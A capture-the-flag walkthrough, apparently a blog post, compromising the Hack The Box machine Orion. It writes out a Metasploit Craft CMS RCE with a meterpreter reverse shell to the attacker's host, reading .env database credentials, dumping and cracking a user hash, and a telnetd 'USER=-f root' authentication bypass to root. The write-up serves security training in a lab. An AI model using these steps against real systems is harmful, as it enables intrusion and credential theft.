---
title: "Orion: Craft CMS RCE to Root (Walkthrough)"
date: 2026-10-24
draft: false
tags:
  - CTF
  - Web Exploitation
  - Privilege Escalation
  - CVE-2025-32432
  - telnetd
categories:
  - CTF Writeups
---

![Orion banner](https://files.catbox.moe/dwonlq.png)

Orion is an Ubuntu 22.04.5 Hack The Box machine themed around a small telecom company. The site lives at `orion.htb`, running Craft CMS 5.6.16 behind nginx, with SSH open and not much else. It's a web-focused box: the app is where the story starts, and most of the interesting bits come from how it's configured.

I'll walk through the whole thing: reconnaissance, the initial foothold, and the path to root, including the parts that didn't go smoothly. If you're following along, you just need the target IP and an `/etc/hosts` entry.

## 01: Recon

I started with the usual nmap script and version scan. I wasn't expecting much beyond SSH and HTTP, and that's exactly what I got:

```bash
sudo nmap -sC -sV -T5 10.129.244.146 -o scan_result_1.txt
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

![nmap scan](https://files.catbox.moe/f9sfe1.png)

Two ports. I also ran a UDP scan and a full TCP scan, mostly out of habit, but nothing else was listening.

The web server wanted a hostname, so I added `orion.htb` to `/etc/hosts`:

```bash
echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
```

![hosts file](https://files.catbox.moe/3297yc.png)

Then I fingerprinted the site. `whatweb` and `curl -I` both pointed at Craft CMS:

```bash
whatweb http://orion.htb
curl -I http://orion.htb
```

![whatweb](https://files.catbox.moe/4ap9w2.png)

`whatweb` gave me the usual summary (nginx, Ubuntu, Craft CMS), and the response headers confirmed it with `X-Powered-By`. The page title was Orion Telecom.

![Craft CMS headers](https://files.catbox.moe/wbkqk8.png)

There was an admin panel, but I didn't have a login yet. I ran ffuf against the usual raft wordlist:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt \
     -u http://orion.htb/FUZZ
```

![ffuf](https://files.catbox.moe/ni3is8.png)

A lot of the `p1`, `p2`, `p13` results were the same 12,272-byte catch-all page, so I ignored them. The useful hits were `admin`, `assets`, and `logout`. `/admin` redirected to `/admin/login`, and the footer gave away the version: Craft CMS 5.6.16.

![Craft CMS admin login](https://files.catbox.moe/hrwxmi.png)

## 02: Shell via Craft CMS

Craft CMS 5.6.16 is vulnerable to CVE-2025-32432, a pre-auth RCE. Metasploit has a module for it, and I saw no reason to rewrite the exploit by hand. I set the target, the PHP meterpreter payload, and my listener:

```text
msf6 > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
msf6 exploit(...) > set RHOSTS orion.htb
msf6 exploit(...) > set RPORT 80
msf6 exploit(...) > set LHOST <YOUR_IP>
msf6 exploit(...) > set LPORT 8080
msf6 exploit(...) > set PAYLOAD php/meterpreter/reverse_http
msf6 exploit(...) > run
```

![Metasploit module options](https://files.catbox.moe/ot5h76.png)

The module leaked the PHP session save path, wrote a payload into it, and triggered it. A few seconds later I had a meterpreter session:

```text
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Meterpreter session 16 opened
```

![Metasploit run](https://files.catbox.moe/0o6snp.png)

The session landed as `www-data` inside `/var/www/html/craft/web`. I tried `shell` to get a proper command shell, but nothing happened, and the usual Python PTY trick didn't work either. I stopped fighting it and used Meterpreter's `execute` to run commands directly.

## 03: `.env` and the database

`cat` works fine in Meterpreter, so I read `.env` first:

```text
meterpreter > cat .env
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=<password>
```

![Craft CMS .env](https://files.catbox.moe/7nmcu4.png)

The app was talking to MySQL as root. That's the kind of thing that turns a web shell into a full database compromise.

Since I didn't have a shell, I ran MySQL with `execute` and redirected the output to a file:

```text
meterpreter > execute -f /usr/bin/mysql -a "-h localhost -uroot -p'<password>' orion -e 'SHOW TABLES;' > /tmp/mysql_tables.txt"
Process 2291 created.
meterpreter > cat /tmp/mysql_tables.txt
```

![MySQL tables](https://files.catbox.moe/4klpbp.png)

Then the users table, same trick:

```text
id  username  email             password      admin
1   admin     adam@orion.htb    <password>    1
```

![Craft CMS users table](https://files.catbox.moe/iawr26.png)

The admin email was `adam@orion.htb`. That was a pretty obvious hint that the same person had a local account.

## 04: Cracking the hash

The password was stored as a bcrypt hash. I saved it to a file and threw `rockyou.txt` at it with john:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt adam_hash.txt
```

![John the Ripper](https://files.catbox.moe/xqrntz.png)

It cracked almost immediately. The password was weak enough to be in the wordlist. That gave me SSH credentials for `adam`.

## 05: SSH as adam

SSH as `adam` worked with the cracked password. I grabbed `user.txt` and checked sudo:

```bash
cat user.txt
```

```text
<flag>
```

![User flag](https://files.catbox.moe/dzygty.png)

Nothing. No sudo rights, no obvious SUID shortcuts. Time to look at what else the box was running.

## 06: Privesc via localhost telnetd

I checked the listening sockets with `ss -lntp`. Most of it was expected (SSH, nginx, MySQL, local DNS), but there was one line I didn't expect: `127.0.0.1:23`.

```bash
ss -lntp
```

![Local services and telnet version](https://files.catbox.moe/gbsv4k.png)

Port 23 was telnetd, bound to localhost. It wasn't reachable from the network, but it was reachable from the shell. The version was GNU inetutils 2.7, which is vulnerable to CVE-2026-24061.

The bug is a trust issue. telnetd accepts a client-supplied `USER` variable through the TELNET `NEW-ENVIRON` option and passes it to `/bin/login` without sanitizing it. If the value is `-f root`, `login` treats `-f` as its force-login flag and skips authentication.

A small PoC connects to `localhost:23`, sends the variable, and gets a root shell. I used [JayGLXR's CVE-2026-24061-POC](https://github.com/JayGLXR/CVE-2026-24061-POC):

```text
$ python3 poc.py 127.0.0.1 23
CVE-2026-24061 - GNU Inetutils telnetd Auth Bypass
[*] Target: 127.0.0.1:23
[+] Connected
[*] Injected USER=-f root
[*] Injected USER=-f root

whoami
[+] VULNERABLE
```

![telnetd bypass](https://files.catbox.moe/kurnre.png)

The session that came back was a root login:

```text
Linux 5.15.0-177-generic (orion) (pts/1)
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)
```

## 07: Root

With root, the last flag was just a `cat` away:

```bash
id
whoami
cat /root/root.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
root
<flag>
```

![Root flag](https://files.catbox.moe/mswh8z.png)

That's the box.

## The chain

1. **Craft CMS 5.6.16**: pre-auth RCE (`CVE-2025-32432`) → `www-data` shell
2. **`.env`** → MySQL root credentials
3. **`users` table** → admin bcrypt hash
4. **john + rockyou** → SSH as `adam`
5. **localhost telnetd**: auth bypass (`CVE-2026-24061`) → root
6. **`/root/root.txt`**

One bug led to the next: the CMS leaked a config file, the config file leaked the database, the database leaked a password, and a localhost-only telnetd finished the job.

---

*Authorized training environment only. Don't test systems you don't own or have permission to assess.*
